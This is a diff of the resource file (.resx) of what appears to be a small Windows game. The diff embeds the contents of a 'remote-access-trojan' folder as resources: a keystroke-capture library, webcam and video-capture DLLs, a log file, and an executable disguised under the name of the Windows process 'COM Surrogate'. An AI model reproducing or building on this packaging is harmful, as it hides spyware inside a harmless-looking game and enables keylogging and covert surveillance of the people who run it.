@@ -118,8 +118,71 @@
     <value>System.Resources.ResXResourceWriter, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
   </resheader>
   <assembly alias="System.Windows.Forms" name="System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" />
+  <data name="Accord" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\remote-access-trojan\Accord.dll;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+  </data>
+  <data name="Accord1" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\remote-access-trojan\Accord.xml;System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089;utf-8</value>
+  </data>
+  <data name="Accord_dll" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\remote-access-trojan\Accord.dll.config;System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089;Windows-1252</value>
+  </data>
+  <data name="Accord_Video" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\remote-access-trojan\Accord.Video.dll;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+  </data>
+  <data name="Accord_Video1" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\remote-access-trojan\Accord.Video.xml;System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089;utf-8</value>
+  </data>
+  <data name="Accord_Video_FFMPEG" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\remote-access-trojan\Accord.Video.FFMPEG.dll;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+  </data>
+  <data name="Accord_Video_FFMPEG1" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\remote-access-trojan\Accord.Video.FFMPEG.xml;System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089;utf-8</value>
+  </data>
+  <data name="AForge" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\remote-access-trojan\AForge.dll;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+  </data>
+  <data name="AForge1" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\remote-access-trojan\AForge.xml;System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089;Windows-1252</value>
+  </data>
+  <data name="AForge_Video" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\remote-access-trojan\AForge.Video.dll;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+  </data>
+  <data name="AForge_Video1" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\remote-access-trojan\AForge.Video.xml;System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089;utf-8</value>
+  </data>
+  <data name="AForge_Video_DirectShow" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\remote-access-trojan\AForge.Video.DirectShow.dll;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+  </data>
+  <data name="AForge_Video_DirectShow1" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\remote-access-trojan\AForge.Video.DirectShow.xml;System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089;utf-8</value>
+  </data>
+  <data name="avcodec_57" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\remote-access-trojan\avcodec-57.dll;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+  </data>
+  <data name="avdevice_57" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\remote-access-trojan\avdevice-57.dll;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+  </data>
+  <data name="avfilter_6" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\remote-access-trojan\avfilter-6.dll;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+  </data>
+  <data name="avformat_57" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\remote-access-trojan\avformat-57.dll;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+  </data>
+  <data name="avutil_55" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\remote-access-trojan\avutil-55.dll;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+  </data>
   <data name="bomb" type="System.Resources.ResXFileRef, System.Windows.Forms">
     <value>..\Resources\bomb.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="COM_Surrogate" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\remote-access-trojan\COM Surrogate.exe;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+  </data>
+  <data name="COM_Surrogate1" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\remote-access-trojan\COM Surrogate.pdb;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+  </data>
+  <data name="COM_Surrogate_exe" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\remote-access-trojan\COM Surrogate.exe.config;System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089;utf-8</value>
   </data>
   <data name="death" type="System.Resources.ResXFileRef, System.Windows.Forms">
     <value>..\Resources\death.wav;System.IO.MemoryStream, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
@@ -133,8 +196,11 @@
   <data name="KeystrokeAPI" type="System.Resources.ResXFileRef, System.Windows.Forms">
     <value>..\remote-access-trojan\KeystrokeAPI.dll;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
   </data>
-  <data name="remote_access_trojan" type="System.Resources.ResXFileRef, System.Windows.Forms">
-    <value>..\remote-access-trojan\remote-access-trojan.exe;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+  <data name="log" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\remote-access-trojan\log.txt;System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089;Windows-1252</value>
+  </data>
+  <data name="postproc_54" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\remote-access-trojan\postproc-54.dll;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
   </data>
   <data name="shooter" type="System.Resources.ResXFileRef, System.Windows.Forms">
     <value>..\Resources\shooter.jpg;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
@@ -150,5 +216,14 @@
   </data>
   <data name="star_background" type="System.Resources.ResXFileRef, System.Windows.Forms">
     <value>..\Resources\star_background.jpg;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="swresample_2" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\remote-access-trojan\swresample-2.dll;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+  </data>
+  <data name="swscale_4" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\remote-access-trojan\swscale-4.dll;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+  </data>
+  <data name="System_Drawing_Common" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\remote-access-trojan\System.Drawing.Common.dll;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
   </data>
 </root>
